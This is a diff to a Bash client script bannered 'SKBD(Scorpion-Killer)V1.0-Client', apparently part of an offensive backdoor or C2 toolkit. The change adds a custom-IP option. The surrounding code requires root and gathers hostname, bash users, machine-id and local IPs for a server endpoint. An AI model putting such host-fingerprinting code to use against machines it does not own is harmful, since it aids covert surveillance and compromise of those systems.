@@ -30,9 +30,10 @@ ${PURPLE}Maptnh@S-H4CK13  SKBD(Scorpion-Killer)V1.0-Client  https://github.com/M
 echo -e "$SKBD"   
 
 usage() {
-    echo -e "${CYAN}Usage: $0 [-e ENDPOINT]"
+    echo -e "${CYAN}Usage: $0 [-e ENDPOINT] [-l CUSTOM_IP]"   
     echo -e "${WHITE}Options:"
     echo -e "  -e ENDPOINT   Specify the server endpoint. (Required)"
+    echo -e "  -l IP         Specify custom local IP to add (Optional)"   
     echo -e "  -h            Display this help message."
     echo -e "${RESET}"
 }
@@ -64,10 +65,15 @@ if [ "$(id -u)" -ne 0 ]; then
 fi
 
 ENDPOINT=""
-while getopts ":e:h" opt; do
+LOCAL_IP=""
+
+while getopts ":e:hl:" opt; do 
   case $opt in
     e)
       ENDPOINT=$OPTARG
+      ;;
+    l)  
+      LOCAL_IP=$OPTARG
       ;;
     h)
       usage
@@ -75,6 +81,11 @@ while getopts ":e:h" opt; do
       ;;
     \?)
       echo -e "${RED}[!] Invalid option: -$OPTARG${RESET}" >&2
+      usage
+      exit 1
+      ;;
+    :)  
+      echo -e "${RED}[!] Option -$OPTARG requires an argument.${RESET}" >&2
       usage
       exit 1
       ;;
@@ -91,7 +102,12 @@ r_md5=$(openssl rand -hex 16)
 hostname=$(hostname)
 users=$(getent passwd | grep -E 'bash$' | cut -d: -f1 | paste -sd, -)
 sn=$(cat /etc/machine-id)
-ips=$(ip addr show | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | tr '\n' ',')
+auto_ips=$(ip addr show | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | tr '\n' ',')
+if [ -n "$LOCAL_IP" ]; then
+    ips="${auto_ips}${LOCAL_IP}," 
+else
+    ips="$auto_ips"
+fi
 echo -e "${YELLOW}[+] MD5: $r_md5${RESET}"
 echo -e "${YELLOW}[+] Endpoint: $ENDPOINT${RESET}"
 echo -e "${YELLOW}[+] Hostname: $hostname${RESET}"
